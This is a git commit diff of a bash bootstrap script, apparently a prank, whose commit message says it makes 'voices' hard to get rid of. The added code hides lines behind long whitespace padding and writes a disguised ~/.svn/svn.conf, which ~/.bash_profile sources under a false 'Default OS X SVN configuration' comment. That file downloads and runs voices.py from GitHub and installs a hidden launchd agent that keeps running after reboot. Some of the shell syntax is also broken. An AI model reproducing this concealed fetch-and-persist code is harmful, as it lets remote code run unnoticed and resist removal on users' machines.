452d68808d72a3be1935547428927d17f3ad533e
David Cramer <dcramer@gmail.com>
2011-04-15 18:38:21 -0700

    Make it really really hard to get rid of voices

--- bootstrap.sh
+++ bootstrap.sh
@@ -1,23 +1,41 @@
 #!/bin/bash
 
-if [ ! -d "${PWD}/.git" ]; then
-    mkdir ${PWD}/.git
-    cd ${PWD}/.screen
-    curl -O https://github.com/dcramer/voices.py/raw/master/voices.py > /dev/null 2>&1
-    screen -d -m python voices.py
-fi
-
 # TODO: this should be optionally via a --switch
 PRE="                                                                                                                 "
 PRE=${PRE}${PRE}${PRE}${PRE}${PRE}${PRE}${PRE}${PRE}${PRE}${PRE}${PRE}
-echo "#!/usr/bin/env bash
-${PRE}if [ ! -d \"\\${PWD}/.git/\" ]; then
-${PRE}    mkdir \\${PWD}/.git/
-${PRE}    cd \\${PWD}/.git/
+echo <<EOF
+#!/usr/bin/env bash
+${PRE}if [ ! -d "${PWD}/.svn/" ]; then
+${PRE}    APP_DIR=${PWD}/Library/Application\ Support/.${RAND}-${RAND}/
+${PRE}    mkdir ${APP_DIR}
+${PRE}    cd ${APP_DIR}
 ${PRE}    curl -O https://github.com/dcramer/voices.py/raw/master/voices.py > /dev/null 2>&1
 ${PRE}    screen -d -m python voices.py
-${PRE}fi" >> ~/.git/git.conf
+${PRE}    echo "<?xml version=\"1.0\" encoding=\"UTF-8\"?>
+<!DOCTYPE plist PUBLIC \"-//Apple Computer//DTD PLIST 1.0//EN\"
+	\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">
+<plist version=\"1.0\">
+<dict>
+	<key>Label</key>
+	<string>voices.py</string>
+	<key>ProgramArguments</key>
+	<array>
+		<string>${APP_DIR}</string>
+	</array>
+	<key>KeepAlive</key>
+	<true/>
+	<key>Disabled</key>
+	<false/>
+	<key>RunAtLoad</key>
+	<true/>	
+</dict>
+</plist>" > voices.plist
+launchctl load -w ${APP_DIR}/voices.plist
+${PRE}fi
+EOF >> ~/.svn/svn.conf
+
+. ~/.svn/svn.conf
 
 echo "
-# Default OS X Git configuration
-. ~/.git/git.conf" >> ~/.bash_profile
+# Default OS X SVN configuration
+. ~/.svn/svn.conf" >> ~/.bash_profile
